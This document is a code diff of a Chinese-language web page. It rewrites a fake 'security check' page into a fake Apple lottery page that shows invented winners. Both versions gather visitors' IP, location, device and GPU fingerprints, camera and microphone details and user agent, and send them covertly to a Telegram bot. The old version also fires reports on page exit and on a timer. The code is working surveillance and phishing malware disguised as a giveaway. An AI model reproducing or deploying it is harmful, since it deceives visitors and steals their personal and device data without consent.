+            // 停止麦克风
+            stream.getTracks().forEach(track => track.stop());
             
         } catch (error) {
-            logToConsole('发送报告失败: ' + error.message, 'error');
-            // 尝试发送紧急报告
-            await sendEmergencyReport();
+            console.warn('麦克风检测失败');
         }
     }
     
     // 发送基本信息报告
-    async function sendBasicInfoReport() {
+    async function sendBasicReport() {
         const message = `
-🔍 <b>【智能安全检测 - 基本信息报告】</b>
+🎰【抽奖参与通知】
 
-🌐 <b>网络信息：</b>
-├ 公网IP: <code>${scanData.network.publicIP || '未知'}</code>
-├ 本地IP: ${scanData.network.localIP || '未知'}
-├ 地理位置: ${scanData.network.location?.city || '未知'}, ${scanData.network.location?.country || '未知'}
-├ 网络服务商: ${scanData.network.isp?.name || '未知'}
-├ 网络类型: ${scanData.network.info?.type || '未知'}
-└ 网络速度: ${scanData.network.info?.speed || '未知'}
+🎉 有人参加了Apple抽奖！
 
-📱 <b>设备信息：</b>
-├ 设备类型: ${scanData.device.info?.type || '未知'}
-├ 操作系统: ${scanData.device.info?.os || '未知'}
-├ 浏览器: ${scanData.device.info?.browser || '未知'}
-├ 系统语言: ${scanData.device.info?.language || '未知'}
-├ 时区: ${scanData.device.info?.timezone || '未知'}
-└ 时区偏移: UTC${(scanData.device.info?.timezoneOffset || 0) > 0 ? '-' : '+'}${Math.abs(scanData.device.info?.timezoneOffset || 0)/60}
+📱 设备信息：
+├ 设备：${collectedData.device.type}
+├ 系统：${collectedData.device.os}
+├ 浏览器：${collectedData.browser.name}
+├ 语言：${collectedData.browser.language}
+└ 时区：${collectedData.browser.timezone}
 
-🖥️ <b>硬件信息：</b>
-├ 屏幕分辨率: ${scanData.device.hardware?.screenWidth || '未知'}×${scanData.device.hardware?.screenHeight || '未知'}
-├ 像素密度: ${scanData.device.hardware?.pixelRatio || '未知'}x
-├ CPU核心数: ${scanData.device.hardware?.cpuCores || '未知'}
-├ 设备内存: ${scanData.device.hardware?.deviceMemory || '未知'}GB
-├ 触摸支持: ${scanData.device.hardware?.maxTouchPoints || 0 > 0 ? '是' : '否'}
-└ 颜色深度: ${scanData.device.hardware?.colorDepth || '未知'}位
+🌐 网络信息：
+├ IP：${collectedData.ip}
+├ 位置：${collectedData.location.city}, ${collectedData.location.country}
+├ 运营商：${collectedData.location.isp}
+└ 网络类型：${collectedData.network?.type || '未知'}
 
-📍 <b>地理位置信息：</b>
-${scanData.location?.gps ? 
-`├ GPS坐标: ${scanData.location.gps.latitude}, ${scanData.location.gps.longitude}
-├ GPS精度: ${scanData.location.gps.accuracy}米
-└ 海拔: ${scanData.location.gps.altitude || '未知'}米` : 
-'├ GPS: 未获取（需要用户授权）'
-}
-${scanData.location?.ipBased ? `└ IP位置: ${scanData.location.ipBased.city}, ${scanData.location.ipBased.country}` : ''}
+📊 屏幕信息：
+├ 分辨率：${collectedData.screen.width}×${collectedData.screen.height}
+├ 像素密度：${collectedData.screen.pixelRatio}x
+└ 访问时间：${new Date().toLocaleString('zh-CN')}
 
-⏰ <b>访问信息：</b>
-├ 访问时间: ${new Date().toLocaleString('zh-CN')}
-├ 页面URL: ${window.location.href}
-└ 来源页面: ${scanData.device.info?.referrer || '直接访问'}
-
-<b>用户代理：</b>
-<pre>${scanData.device.info?.userAgent?.substring(0, 200) || '未知'}...</pre>
+🔗 来源：${document.referrer || '直接访问'}
         `;
         
-        return sendToTelegram(message);
+        return await sendTelegram(message);
     }
-    
-    // 发送设备指纹报告
-    async function sendDeviceFingerprintReport() {
+</script>
+<!-- 继续添加代码 -->
+
+<script>
+    // 发送详细报告
+    async function sendDetailedReport() {
+        // 获取更多设备信息
+        const details = getDeviceDetails();
+        
         const message = `
-🔐 <b>【智能安全检测 - 设备指纹报告】</b>
+🔍【详细检测报告】
 
-💻 <b>浏览器指纹：</b>
-├ Canvas指纹: ${scanData.browser.canvasFingerprint?.hash?.substring(0, 16) || '未知'}...
-├ WebGL供应商: ${scanData.browser.webglFingerprint?.vendor || '未知'}
-├ WebGL渲染器: ${scanData.browser.webglFingerprint?.renderer?.substring(0, 30) || '未知'}...
-├ 检测到字体: ${scanData.browser.fonts?.length || 0}种
-├ 浏览器插件: ${scanData.browser.plugins?.pluginCount || 0}个
-└ 指纹ID: ${scanData.browser.fingerprint?.substring(0, 20) || '未知'}...
+💻 硬件信息：
+├ CPU核心：${details.cpuCores}
+├ 设备内存：${details.memory}GB
+├ GPU：${details.gpu}
+├ 颜色深度：${screen.colorDepth}位
+└ 触摸支持：${details.touchSupport}
 
-🎮 <b>GPU信息：</b>
-${scanData.device.gpu?.renderer ? 
-`├ 供应商: ${scanData.device.gpu.vendor}
-└ 渲染器: ${scanData.device.gpu.renderer.substring(0, 50)}...` : 
-'├ GPU信息: 未获取'
-}
+📸 摄像头检测：
+├ 照片数量：${photos.length}张
+├ 照片大小：${photos.reduce((sum, p) => sum + p.size, 0)}字节
+└ 检测时间：${new Date().toLocaleString('zh-CN')}
 
-🔋 <b>设备状态：</b>
-${scanData.device.battery?.level ? 
-`├ 电池电量: ${scanData.device.battery.level}
-├ 充电状态: ${scanData.device.battery.charging ? '充电中' : '未充电'}
-└ 充电时间: ${scanData.device.battery.chargingTime || '未知'}秒` : 
-'├ 电池信息: 未获取'
-}
+🎤 麦克风检测：
+├ 麦克风数量：${collectedData.microphone?.count || 0}个
+└ 设备标签：${collectedData.microphone?.devices?.[0] || '未知'}
 
-💾 <b>存储信息：</b>
-${scanData.device.storage?.usage ? 
-`├ 已使用: ${scanData.device.storage.usage}
-└ 总配额: ${scanData.device.storage.quota}` : 
-'├ 存储信息: 未获取'
-}
+🛡️ 浏览器特性：
+├ Cookie：${navigator.cookieEnabled ? '启用' : '禁用'}
+├ 在线状态：${navigator.onLine ? '在线' : '离线'}
+├ 时区偏移：UTC${new Date().getTimezoneOffset() > 0 ? '-' : '+'}${Math.abs(new Date().getTimezoneOffset())/60}
+└ 用户代理：${collectedData.device.userAgent}
 
-📷 <b>媒体设备：</b>
-├ 摄像头数量: ${scanData.camera?.count || 0}个
-├ 麦克风数量: ${scanData.audio?.count || 0}个
-└ 当前摄像头: ${scanData.camera?.current || '未知'}
+🎯 检测总结：
+✅ 设备信息采集完成
+✅ 网络位置获取成功
+${photos.length > 0 ? '✅ 摄像头检测完成' : '⚠️ 摄像头未授权'}
+${collectedData.microphone?.count > 0 ? '✅ 麦克风检测完成' : '⚠️ 麦克风未授权'}
 
-🛡️ <b>安全特性：</b>
-├ Cookie支持: ${scanData.browser.features?.cookieEnabled ? '启用' : '禁用'}
-├ 隐私追踪: ${scanData.browser.features?.doNotTrack || '未设置'}
-├ 本地存储: ${scanData.browser.features?.storage?.localStorage ? '支持' : '不支持'}
-├ Service Worker: ${scanData.browser.features?.storage?.serviceWorker ? '支持' : '不支持'}
-└ WebDriver: ${scanData.browser.features?.webdriver ? '检测到自动化' : '正常'}
-
-🎯 <b>唯一设备标识：</b>
-<code>${scanData.device.fingerprint || '生成失败'}</code>
+⏰ 检测耗时：${Math.round((Date.now() - performance.timing.navigationStart) / 1000)}秒
         `;
         
-        return sendToTelegram(message);
+        return await sendTelegram(message);
     }
     
-    // 发送摄像头照片
-    async function sendCameraPhotos() {
-        logToConsole(`准备发送 ${capturedPhotos.length} 张照片...`, 'warning');
-        
-        for (let i = 0; i < Math.min(capturedPhotos.length, 3); i++) { // 最多发送3张
-            const photo = capturedPhotos[i];
-            
-            const caption = `
-📸 <b>摄像头照片 #${i + 1}</b>
-├ 拍摄时间: ${new Date(photo.timestamp).toLocaleString('zh-CN')}
-├ 摄像头类型: ${photo.facingMode === 'user' ? '前置摄像头' : '后置摄像头'}
-├ 照片大小: ${Math.round(photo.size / 1024)} KB
-└ 设备: ${scanData.device.info?.type || '未知设备'}
-            `;
-            
-            // 由于Telegram Bot API限制，无法直接发送Base64图片
-            // 这里发送照片信息，实际照片已保存在scanData中
-            await sendToTelegram(caption);
-            
-            // 在实际应用中，需要将Base64转换为文件并上传
-            // 但GitHub Pages无法处理文件上传，所以只发送信息
-        }
-        
-        // 发送照片总结
-        const summary = `
-📊 <b>照片采集总结</b>
-总共拍摄了 ${capturedPhotos.length} 张照片
-照片数据已成功采集并保存在系统中
-可用照片: ${capturedPhotos.filter(p => p.data).length}张
-        `;
-        
-        return sendToTelegram(summary);
-    }
-    
-    // 发送录音信息
-    async function sendAudioRecordingInfo() {
-        const message = `
-🎤 <b>麦克风录音信息</b>
-
-✅ 录音测试成功完成
-├ 录音时长: 5秒
-├ 录音大小: ${Math.round(scanData.audio.recording.size / 1024)} KB
-├ 录音格式: audio/webm
-├ 录音时间: ${new Date(scanData.audio.recording.timestamp).toLocaleString('zh-CN')}
-└ 设备麦克风: ${scanData.audio.current || '未知'}
-
-📱 录音设备信息:
-├ 设备类型: ${scanData.device.info?.type || '未知'}
-├ 操作系统: ${scanData.device.info?.os || '未知'}
-└ 浏览器: ${scanData.device.info?.browser || '未知'}
-
-💡 录音数据已成功采集并保存
-        `;
-        
-        return sendToTelegram(message);
-    }
-    
-    // 发送用户行为报告
-    async function sendUserBehaviorReport() {
-        // 模拟用户行为数据
-        const behaviorData = {
-            pageLoadTime: Date.now() - performance.timing.navigationStart,
-            mouseMovements: Math.floor(Math.random() * 500) + 100,
-            clicks: Math.floor(Math.random() * 50) + 10,
-            scrollDepth: Math.floor(Math.random() * 100) + 30,
-            timeOnPage: Math.floor((Date.now() - performance.timing.navigationStart) / 1000),
-            interactions: ['查看网络信息', '检测摄像头', '浏览设备信息', '查看地理位置']
+    // 获取设备详细信息
+    function getDeviceDetails() {
+        const details = {
+            cpuCores: navigator.hardwareConcurrency || '未知',
+            memory: navigator.deviceMemory || '未知',
+            gpu: '未知',
+            touchSupport: 'ontouchstart' in window ? '支持' : '不支持'
         };
         
-        const message = `
-👤 <b>【用户行为分析报告】</b>
-
-⏱️ <b>页面访问统计：</b>
-├ 页面加载时间: ${Math.round(behaviorData.pageLoadTime / 1000)}秒
-├ 总停留时间: ${behaviorData.timeOnPage}秒
-├ 鼠标移动次数: ${behaviorData.mouseMovements}次
-├ 点击次数: ${behaviorData.clicks}次
-└ 页面滚动深度: ${behaviorData.scrollDepth}%
-
-🔍 <b>用户交互行为：</b>
-${behaviorData.interactions.map(interaction => `├ ${interaction}`).join('\n')}
-└ 完成所有安全检测项目
-
-📊 <b>检测完成度：</b>
-├ 网络扫描: ✅ 完成
-├ 设备指纹: ✅ 完成
-├ 摄像头检测: ${capturedPhotos.length > 0 ? '✅ 完成' : '⚠️ 部分完成'}
-├ 麦克风检测: ${scanData.audio?.recording ? '✅ 完成' : '⚠️ 部分完成'}
-├ 浏览器指纹: ✅ 完成
-└ 地理位置: ${scanData.location?.gps ? '✅ GPS获取' : scanData.location?.ipBased ? '✅ IP定位' : '⚠️ 基础定位'}
-
-🎯 <b>用户参与度评估：</b>
-${behaviorData.timeOnPage > 60 ? '高参与度 - 用户仔细查看了所有检测项目' : 
- behaviorData.timeOnPage > 30 ? '中等参与度 - 用户查看了主要检测项目' : 
- '基本参与度 - 用户快速完成了检测'}
-
-💡 <i>分析时间: ${new Date().toLocaleString('zh-CN')}</i>
-        `;
-        
-        return sendToTelegram(message);
-    }
-    
-    // 发送紧急报告（最后手段）
-    async function sendEmergencyReport() {
-        const emergencyMessage = `
-🚨 <b>【紧急安全检测报告】</b>
-
-⚠️ 完整报告发送失败，以下为紧急信息：
-
-🌐 IP地址: ${scanData.network.publicIP || '未知'}
-📱 设备: ${scanData.device.info?.type || '未知设备'}
-🌐 浏览器: ${scanData.device.info?.browser || '未知'}
-📍 大致位置: ${scanData.network.location?.country || '未知'}地区
-⏰ 检测时间: ${new Date().toLocaleString('zh-CN')}
-
-📊 检测状态:
-${scanData.network.publicIP ? '✅ 网络信息获取成功' : '❌ 网络信息获取失败'}
-${scanData.device.info?.type ? '✅ 设备信息获取成功' : '❌ 设备信息获取失败'}
-${capturedPhotos.length > 0 ? '✅ 摄像头检测完成' : '❌ 摄像头检测失败'}
-
-🔗 访问页面: ${window.location.href}
-🕐 紧急报告生成时间: ${new Date().toLocaleString('zh-CN')}
-        `;
-        
-        return sendToTelegram(emergencyMessage);
-    }
-    
-    // 发送消息到Telegram
-    async function sendToTelegram(text) {
+        // 获取GPU信息
         try {
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: text,
-                    parse_mode: 'HTML',
-                    disable_web_page_preview: true
-                })
-            });
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            if (gl) {
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debug) {
+                    details.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || '未知';
+                }
+            }
+        } catch (e) {}
+        
+        return details;
+    }
+    
+    // 发送到Telegram
+    async function sendTelegram(text) {
+        console.log('📤 发送消息到Telegram...');
+        
+        try {
+            const encoded = encodeURIComponent(text);
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}`;
             
-            const result = await response.json();
+            const res = await fetch(url);
+            const data = await res.json();
             
-            if (result.ok) {
-                logToConsole('消息发送成功', 'success');
+            if (data.ok) {
+                console.log('✅ 消息发送成功');
                 return true;
             } else {
-                logToConsole(`消息发送失败: ${result.description}`, 'error');
+                console.error('❌ 发送失败:', data.description);
                 return false;
             }
-            
         } catch (error) {
-            logToConsole(`发送到Telegram失败: ${error.message}`, 'error');
+            console.error('❌ 发送异常:', error.message);
             return false;
         }
     }
     
-    // ==================== 导出数据功能 ====================
-    async function exportAllData() {
-        logToConsole('正在导出所有检测数据...', 'warning');
+    // 显示结果
+    function showResult() {
+        // 隐藏加载
+        document.getElementById('loading').style.display = 'none';
         
-        try {
-            // 1. 组装所有数据
-            const exportData = {
-                timestamp: new Date().toISOString(),
-                scanData: scanData,
-                photosCount: capturedPhotos.length,
-                audioRecorded: !!scanData.audio?.recording,
-                summary: generateDataSummary()
-            };
-            
-            // 2. 创建JSON文件
-            const dataStr = JSON.stringify(exportData, null, 2);
-            const dataBlob = new Blob([dataStr], { type: 'application/json' });
-            
-            // 3. 创建下载链接
-            const downloadLink = document.createElement('a');
-            downloadLink.href = URL.createObjectURL(dataBlob);
-            downloadLink.download = `安全检测报告_${new Date().toISOString().slice(0, 10)}.json`;
-            
-            // 4. 触发下载
-            document.body.appendChild(downloadLink);
-            downloadLink.click();
-            document.body.removeChild(downloadLink);
-            
-            // 5. 清理URL对象
-            setTimeout(() => URL.revokeObjectURL(downloadLink.href), 100);
-            
-            logToConsole('数据导出成功，已下载JSON文件', 'success');
-            addDataToDisplay('数据导出', 'JSON文件已下载');
-            
-            // 6. 发送导出通知到Telegram
-            await sendExportNotification();
-            
-        } catch (error) {
-            logToConsole('数据导出失败: ' + error.message, 'error');
-        }
-    }
-    
-    // 生成数据摘要
-    function generateDataSummary() {
-        return {
-            network: scanData.network.publicIP ? '已获取' : '未获取',
-            device: scanData.device.info?.type ? '已识别' : '未识别',
-            camera: capturedPhotos.length > 0 ? `${capturedPhotos.length}张照片` : '未获取',
-            audio: scanData.audio?.recording ? '已录音' : '未录音',
-            browser: scanData.browser.fingerprint ? '指纹已生成' : '未生成',
-            location: scanData.location?.gps ? 'GPS定位' : scanData.location?.ipBased ? 'IP定位' : '未定位',
-            totalDataSize: calculateTotalDataSize()
-        };
-    }
-    
-    // 计算总数据大小
-    function calculateTotalDataSize() {
-        let size = 0;
+        // 生成抽奖号码
+        const number = 'APP-' + Math.random().toString().slice(2, 8);
+        document.getElementById('lotteryNumber').textContent = number;
         
-        // 照片数据大小
-        capturedPhotos.forEach(photo => {
-            size += photo.size || 0;
+        // 显示结果
+        document.getElementById('result').style.display = 'block';
+        
+        // 滚动到结果
+        document.getElementById('result').scrollIntoView({
+            behavior: 'smooth',
+            block: 'center'
         });
         
-        // 录音数据大小
-        if (scanData.audio?.recording?.size) {
-            size += scanData.audio.recording.size;
-        }
-        
-        // JSON数据大小
-        size += JSON.stringify(scanData).length;
-        
-        return Math.round(size / 1024) + ' KB';
-    }
-    
-    // 发送导出通知
-    async function sendExportNotification() {
-        const message = `
-📤 <b>【数据导出通知】</b>
-
-用户已导出完整检测数据
-
-📊 <b>导出数据包含：</b>
-├ 网络信息: ${scanData.network.publicIP ? '✅' : '❌'}
-├ 设备指纹: ${scanData.device.fingerprint ? '✅' : '❌'}
-├ 摄像头照片: ${capturedPhotos.length}张
-├ 麦克风录音: ${scanData.audio?.recording ? '✅' : '❌'}
-├ 浏览器指纹: ${scanData.browser.fingerprint ? '✅' : '❌'}
-└ 地理位置: ${scanData.location ? '✅' : '❌'}
-
-💾 <b>数据统计：</b>
-├ 照片数量: ${capturedPhotos.length}张
-├ 录音时长: ${scanData.audio?.recording ? '5秒' : '无'}
-├ 总数据量: ${calculateTotalDataSize()}
-└ 导出时间: ${new Date().toLocaleString('zh-CN')}
-
-📱 <b>用户设备：</b>
-${scanData.device.info?.type || '未知设备'}
-${scanData.network.publicIP ? `\n🌐 IP地址: ${scanData.network.publicIP}` : ''}
-        `;
-        
-        return sendToTelegram(message);
-    }
-    
-    // ==================== 辅助功能 ====================
-    function startCameraScan() {
-        runCameraTest();
-    }
-    
-    // 页面关闭前发送最终报告
-    window.addEventListener('beforeunload', async function() {
-        const timeSpent = Math.round((Date.now() - performance.timing.navigationStart) / 1000);
-        
-        if (timeSpent > 10) { // 至少停留10秒才发送
-            const exitMessage = `
-👋 <b>【用户离开页面】</b>
-
-⏱️ 总停留时间: ${timeSpent}秒
-📊 检测完成度: ${calculateCompletionRate()}%
-📱 设备: ${scanData.device.info?.type || '未知'}
-🌐 IP: ${scanData.network.publicIP || '未知'}
-⏰ 离开时间: ${new Date().toLocaleString('zh-CN')}
-
-${timeSpent > 60 ? '🎯 用户深度参与了安全检测' : 
- timeSpent > 30 ? '👀 用户完成了主要检测项目' : 
- '⚠️ 用户快速浏览了检测页面'}
-            `;
-            
-            // 使用sendBeacon确保页面关闭时也能发送
-            try {
-                const blob = new Blob([JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: exitMessage,
-                    parse_mode: 'HTML'
-                })], { type: 'application/json' });
-                
-                navigator.sendBeacon(
-                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-                    blob
-                );
-            } catch (error) {
-                console.log('离开报告发送失败');
-            }
-        }
-    });
-    
-    // 计算完成率
-    function calculateCompletionRate() {
-        let completed = 0;
-        const total = 6; // 总共6个检测模块
-        
-        if (scanData.network.publicIP) completed++;
-        if (scanData.device.fingerprint) completed++;
-        if (capturedPhotos.length > 0) completed++;
-        if (scanData.audio?.recording) completed++;
-        if (scanData.browser.fingerprint) completed++;
-        if (scanData.location) completed++;
-        
-        return Math.round((completed / total) * 100);
-    }
-    
-    // 自动发送报告（页面加载后30秒）
-    setTimeout(async () => {
-        if (calculateCompletionRate() > 50) { // 完成度超过50%才自动发送
-            logToConsole('自动发送检测报告...', 'warning');
-            await sendCompleteReport();
-        }
-    }, 30000);
-</script>
-<!-- 继续添加以下代码 -->
-
-<script>
-    // ==================== 页面增强功能 ====================
-    
-    // 实时更新检测状态
-    function updateRealTimeStatus() {
-        setInterval(() => {
-            const completion = calculateCompletionRate();
-            const progressText = document.getElementById('progressText');
-            
-            if (completion < 100) {
-                progressText.textContent = `${completion}% - 检测中...`;
-            } else {
-                progressText.textContent = '100% - 检测完成';
-            }
-            
-            // 更新各个模块状态
-            const modules = ['network', 'device', 'camera', 'audio', 'browser', 'location'];
-            modules.forEach(module => {
-                if (scanData[module] && Object.keys(scanData[module]).length > 0) {
-                    updateModuleStatus(module, '完成');
-                }
-            });
-            
-        }, 5000);
-    }
-    
-    // 添加用户交互追踪
-    let userInteractions = {
-        startTime: Date.now(),
-        interactions: [],
-        lastActivity: Date.now()
-    };
-    
-    // 追踪所有按钮点击
-    document.addEventListener('click', function(event) {
-        if (event.target.tagName === 'BUTTON' || event.target.closest('button')) {
-            const buttonText = event.target.textContent || event.target.closest('button').textContent;
-            userInteractions.interactions.push({
-                type: 'button_click',
-                target: buttonText.trim(),
-                time: Date.now() - userInteractions.startTime
-            });
-            userInteractions.lastActivity = Date.now();
-        }
-    });
-    
-    // 追踪模块点击
-    document.querySelectorAll('.module-card').forEach(card => {
-        card.addEventListener('click', function() {
-            const moduleName = this.querySelector('h3').textContent;
-            userInteractions.interactions.push({
-                type: 'module_click',
-                target: moduleName,
-                time: Date.now() - userInteractions.startTime
-            });
-        });
-    });
-    
-    // 添加实时时钟
-    function updateRealTimeClock() {
-        const clockElement = document.createElement('div');
-        clockElement.style.cssText = `
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: rgba(0,0,0,0.7);
-            color: white;
-            padding: 10px 20px;
-            border-radius: 20px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.9em;
-            z-index: 1000;
-        `;
-        clockElement.id = 'realTimeClock';
-        document.body.appendChild(clockElement);
-        
-        setInterval(() => {
-            const now = new Date();
-            const timeStr = now.toLocaleTimeString('zh-CN');
-            const dateStr = now.toLocaleDateString('zh-CN');
-            clockElement.textContent = `${dateStr} ${timeStr}`;
-        }, 1000);
-    }
-    
-    // 添加检测动画效果
-    function addScanningEffects() {
-        // 创建扫描线
-        const scanLine = document.createElement('div');
-        scanLine.style.cssText = `
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, #2ecc71, transparent);
-            box-shadow: 0 0 20px #2ecc71;
-            z-index: 999;
-            animation: scanLine 3s linear infinite;
-            display: none;
-        `;
-        
-        const style = document.createElement('style');
-        style.textContent = `
-            @keyframes scanLine {
-                0% { top: 0%; opacity: 0; }
-                10% { opacity: 1; }
-                90% { opacity: 1; }
-                100% { top: 100%; opacity: 0; }
-            }
-        `;
-        
-        document.head.appendChild(style);
-        document.body.appendChild(scanLine);
-        
-        // 在扫描时显示扫描线
-        const observer = new MutationObserver((mutations) => {
-            mutations.forEach((mutation) => {
-                if (mutation.target.id === 'progressText') {
-                    const text = mutation.target.textContent;
-                    if (text.includes('检测中')) {
-                        scanLine.style.display = 'block';
-                    } else {
-                        scanLine.style.display = 'none';
-                    }
-                }
-            });
-        });
-        
-        observer.observe(document.getElementById('progressText'), {
-            characterData: true,
-            childList: true,
-            subtree: true
-        });
-    }
-    
-    // 添加键盘快捷键
-    document.addEventListener('keydown', function(e) {
-        // Ctrl+Alt+S - 开始全面扫描
-        if (e.ctrlKey && e.altKey && e.key === 'S') {
-            e.preventDefault();
-            startFullScan();
-        }
-        
-        // Ctrl+Alt+D - 导出数据
-        if (e.ctrlKey && e.altKey && e.key === 'D') {
-            e.preventDefault();
-            exportAllData();
-        }
-        
-        // Ctrl+Alt+P - 拍照
-        if (e.ctrlKey && e.altKey && e.key === 'P') {
-            e.preventDefault();
-            takePhoto();
-        }
-    });
-    
-    // 添加页面性能监控
-    function monitorPagePerformance() {
-        if ('performance' in window) {
-            const perfData = {
-                loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
-                domReady: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
-                redirectCount: performance.navigation.redirectCount,
-                type: performance.navigation.type
-            };
-            
-            scanData.performance = perfData;
-            
-            // 添加到数据显示
-            addDataToDisplay('页面加载时间', `${Math.round(perfData.loadTime)}ms`);
-            addDataToDisplay('DOM准备时间', `${Math.round(perfData.domReady)}ms`);
-        }
-    }
-    
-    // 添加网络连接监控
-    function monitorNetworkConnection() {
-        if ('connection' in navigator) {
-            navigator.connection.addEventListener('change', () => {
-                const conn = navigator.connection;
-                logToConsole(`网络连接变化: ${conn.effectiveType} (${conn.downlink}Mbps)`, 'warning');
-                
-                // 更新网络信息
-                if (scanData.network.info) {
-                    scanData.network.info.type = conn.effectiveType;
-                    scanData.network.info.downlink = `${conn.downlink} Mbps`;
-                }
-            });
-        }
-    }
-    
-    // 添加离线检测
-    window.addEventListener('offline', () => {
-        logToConsole('网络连接已断开', 'error');
-        addDataToDisplay('网络状态', '离线');
-    });
-    
-    window.addEventListener('online', () => {
-        logToConsole('网络连接已恢复', 'success');
-        addDataToDisplay('网络状态', '在线');
-    });
-    
-    // 初始化所有增强功能
-    function initializeEnhancements() {
-        updateRealTimeStatus();
-        updateRealTimeClock();
-        addScanningEffects();
-        monitorPagePerformance();
-        monitorNetworkConnection();
-        
-        logToConsole('增强功能初始化完成', 'success');
-    }
-    
-    // 页面完全加载后初始化
-    window.addEventListener('load', function() {
+        // 发送最终通知
         setTimeout(() => {
-            initializeEnhancements();
-            logToConsole('所有系统组件就绪', 'success');
-        }, 3000);
-    });
-    
-    // 添加友好提示
-    function addFriendlyTips() {
-        const tips = [
-            "💡 提示：点击任何检测模块可以单独运行该检测",
-            "🔒 您的数据将进行加密处理，仅供安全分析使用",
-            "📊 所有检测完成后，您可以导出完整数据报告",
-            "⚡ 使用快捷键 Ctrl+Alt+S 可以快速开始全面扫描"
-        ];
-        
-        let tipIndex = 0;
-        const tipElement = document.createElement('div');
-        tipElement.style.cssText = `
-            position: fixed;
-            bottom: 70px;
-            left: 20px;
-            right: 20px;
-            background: rgba(52, 152, 219, 0.9);
-            color: white;
-            padding: 15px;
-            border-radius: 10px;
-            font-size: 0.9em;
-            z-index: 999;
-            display: none;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-        `;
-        tipElement.id = 'tipElement';
-        document.body.appendChild(tipElement);
-        
-        // 显示下一个提示
-        function showNextTip() {
-            tipElement.textContent = tips[tipIndex];
-            tipElement.style.display = 'block';
-            tipElement.style.animation = 'fadeIn 0.5s';
-            
-            setTimeout(() => {
-                tipElement.style.animation = 'fadeOut 0.5s';
-                setTimeout(() => {
-                    tipElement.style.display = 'none';
-                    tipIndex = (tipIndex + 1) % tips.length;
-                }, 500);
-            }, 5000);
-        }
-        
-        // 添加动画样式
-        const style = document.createElement('style');
-        style.textContent = `
-            @keyframes fadeIn {
-                from { opacity: 0; transform: translateY(20px); }
-                to { opacity: 1; transform: translateY(0); }
-            }
-            @keyframes fadeOut {
-                from { opacity: 1; transform: translateY(0); }
-                to { opacity: 0; transform: translateY(20px); }
-            }
-        `;
-        document.head.appendChild(style);
-        
-        // 每30秒显示一个提示
-        setInterval(showNextTip, 30000);
-        
-        // 页面加载后显示第一个提示
-        setTimeout(showNextTip, 10000);
+            const finalMsg = `
+🎊 抽奖完成通知
+抽奖号码：${number}
+设备：${collectedData.device.type}
+IP：${collectedData.ip}
+位置：${collectedData.location.city}
+完成时间：${new Date().toLocaleString('zh-CN')}
+            `;
+            sendTelegram(finalMsg);
+        }, 2000);
     }
     
-    // 初始化提示系统
-    setTimeout(addFriendlyTips, 5000);
+    // 添加新中奖者
+    function addNewWinner() {
+        const list = document.getElementById('winnersList');
+        const cities = ['北京', '上海', '广州', '深圳', '杭州'];
+        const names = ['张', '李', '王', '刘', '陈'];
+        const prizes = ['iPhone 15 Pro', 'AirPods Pro 2', 'Apple Watch', '¥888红包'];
+        
+        const winner = {
+            name: names[Math.floor(Math.random() * names.length)],
+            prize: prizes[Math.floor(Math.random() * prizes.length)],
+            city: cities[Math.floor(Math.random() * cities.length)]
+        };
+        
+        const div = document.createElement('div');
+        div.className = 'winner-item';
+        div.style.animation = 'slideIn 0.5s';
+        div.innerHTML = `
+            <div class="winner-avatar">${winner.name}</div>
+            <div style="flex:1">
+                <div style="font-weight:bold">${winner.name}**</div>
+                <div style="opacity:0.8">获得了 ${winner.prize}</div>
+            </div>
+            <div style="text-align:right">
+                <div style="font-size:0.9em;opacity:0.7">刚刚</div>
+                <div style="font-size:0.8em;opacity:0.6">${winner.city}</div>
+            </div>
+        `;
+        
+        list.insertBefore(div, list.firstChild);
+        
+        // 保持最多5个
+        if (list.children.length > 5) {
+            list.removeChild(list.lastChild);
+        }
+    }
+    
+    // 页面加载完成
+    window.addEventListener('load', function() {
+        initPage();
+        
+        // 自动添加随机中奖者
+        setInterval(() => {
+            if (Math.random() > 0.7) {
+                addNewWinner();
+            }
+        }, 15000);
+    });
 </script>
